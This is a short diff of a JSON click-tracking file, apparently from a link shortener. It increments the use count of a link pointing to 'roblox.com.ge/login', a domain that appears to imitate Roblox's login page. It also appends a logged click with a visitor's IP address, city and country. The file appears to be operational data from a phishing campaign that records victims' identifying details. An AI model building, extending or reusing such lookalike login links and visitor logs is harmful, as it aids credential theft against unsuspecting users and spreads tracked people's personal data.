@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1345,
+    "useCount": 1346,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10928,6 +10928,14 @@
         "city": "Williamston",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777413247132,
+        "ip": "82.217.184.134",
+        "country": "Netherlands",
+        "city": "Emmen",
+        "flag": "🇳🇱",
+        "countryCode": "NL"
       }
     ]
   },
